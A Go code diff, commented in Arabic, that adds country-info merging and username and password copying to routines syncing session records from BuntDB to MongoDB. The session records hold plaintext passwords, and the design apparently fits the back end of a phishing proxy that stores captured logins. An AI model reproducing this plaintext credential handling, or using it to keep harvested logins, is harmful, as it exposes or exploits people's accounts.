@@ -339,7 +339,7 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 		}
 		
 		// تحقق ما إذا كانت الجلسة موجودة بالفعل في MongoDB
-		_, err := mongoDb.GetSessionBySid(s.SessionId)
+		mongoSession, err := mongoDb.GetSessionBySid(s.SessionId)
 		if err != nil {
 			// إنشاء الجلسة في MongoDB إذا لم تكن موجودة
 			log.Debug("الجلسة غير موجودة في MongoDB، يتم إنشاؤها...")
@@ -396,10 +396,55 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 				}
 			}
 			
+			// تحديث معلومات البلد إذا كانت موجودة في BuntDB
+			if s.CountryCode != "" && s.Country != "" {
+				log.Debug("تحديث معلومات البلد للجلسة %s (البلد: %s، رمز البلد: %s) من BuntDB إلى MongoDB", 
+					s.SessionId, s.Country, s.CountryCode)
+				err = mongoDb.SetSessionCountryInfo(s.SessionId, s.CountryCode, s.Country)
+				if err != nil {
+					log.Error("فشل تحديث معلومات البلد: %v", err)
+				} else {
+					log.Success("تم تحديث معلومات البلد بنجاح")
+				}
+			}
+			
 			success++
 			log.Info("تمت مزامنة الجلسة %s من BuntDB إلى MongoDB", s.SessionId)
 		} else {
 			log.Debug("الجلسة %s موجودة بالفعل في MongoDB", s.SessionId)
+			
+			// أهم جزء: لا نقوم بتحديث معلومات البلد في MongoDB إذا كانت غير فارغة
+			// حتى لو كانت فارغة في BuntDB
+			
+			// تحقق إذا كانت MongoDB تحتوي على معلومات البلد بالفعل
+			if mongoSession.CountryCode != "" && mongoSession.Country != "" {
+				log.Debug("الجلسة %s تحتوي بالفعل على معلومات البلد في MongoDB (البلد: %s، رمز البلد: %s)، سيتم الاحتفاظ بها", 
+					s.SessionId, mongoSession.Country, mongoSession.CountryCode)
+			} else if s.CountryCode != "" && s.Country != "" {
+				// إذا كانت المعلومات فارغة في MongoDB ولكنها موجودة في BuntDB، نقوم بتحديثها
+				log.Debug("الجلسة %s لا تحتوي على معلومات البلد في MongoDB، وموجودة في BuntDB، سيتم تحديثها", s.SessionId)
+				err = mongoDb.SetSessionCountryInfo(s.SessionId, s.CountryCode, s.Country)
+				if err != nil {
+					log.Error("فشل تحديث معلومات البلد: %v", err)
+				} else {
+					log.Success("تم تحديث معلومات البلد في MongoDB من BuntDB")
+				}
+			}
+			
+			// تحديث البيانات المهمة الأخرى إذا كانت مختلفة
+			if s.Username != "" && mongoSession.Username != s.Username {
+				err = mongoDb.SetSessionUsername(s.SessionId, s.Username)
+				if err != nil {
+					log.Error("فشل تحديث اسم المستخدم المتغير: %v", err)
+				}
+			}
+			
+			if s.Password != "" && mongoSession.Password != s.Password {
+				err = mongoDb.SetSessionPassword(s.SessionId, s.Password)
+				if err != nil {
+					log.Error("فشل تحديث كلمة المرور المتغيرة: %v", err)
+				}
+			}
 		}
 	}
 	
@@ -480,6 +525,41 @@ func monitorSessionUpdates(buntDb *database.Database, mongoDb database.IDatabase
 						log.Error("فشل تحديث البيانات المخصصة في MongoDB: %v", err)
 					} else {
 						log.Success("تم تحديث البيانات المخصصة في MongoDB: %s = %s", key, value)
+					}
+				}
+			}
+			
+			// إضافة جديدة: التحقق من تحديث معلومات البلد
+			countryCodeChanged := current.CountryCode != previous.CountryCode && current.CountryCode != ""
+			countryChanged := current.Country != previous.Country && current.Country != ""
+			
+			if countryCodeChanged || countryChanged {
+				log.Debug("تم اكتشاف تحديث معلومات البلد: %s/%s -> %s/%s", 
+					previous.CountryCode, previous.Country, 
+					current.CountryCode, current.Country)
+					
+				// تحقق أولاً من القيم في MongoDB قبل التحديث لتجنب محو البيانات الموجودة
+				mongoSession, err := mongoDb.GetSessionBySid(current.SessionId)
+				if err != nil {
+					log.Error("فشل استرداد الجلسة من MongoDB: %v", err)
+				} else {
+					// تحقق إذا كانت MongoDB لديها بالفعل معلومات البلد
+					hasMongoCountryCode := mongoSession.CountryCode != ""
+					hasMongoCountry := mongoSession.Country != ""
+					
+					// إذا كانت معلومات البلد في MongoDB أكثر اكتمالاً، نحافظ عليها
+					if hasMongoCountryCode && hasMongoCountry && 
+						(current.CountryCode == "" || current.Country == "") {
+						log.Debug("تم تجاهل التحديث لأن MongoDB تحتوي على بيانات أكثر اكتمالاً: %s/%s", 
+							mongoSession.CountryCode, mongoSession.Country)
+					} else if current.CountryCode != "" && current.Country != "" {
+						// تحديث البيانات فقط إذا كانت BuntDB تحتوي على قيم غير فارغة
+						err = mongoDb.SetSessionCountryInfo(current.SessionId, current.CountryCode, current.Country)
+						if err != nil {
+							log.Error("فشل تحديث معلومات البلد في MongoDB: %v", err)
+						} else {
+							log.Success("تم تحديث معلومات البلد في MongoDB: %s/%s", current.CountryCode, current.Country)
+						}
 					}
 				}
 			}
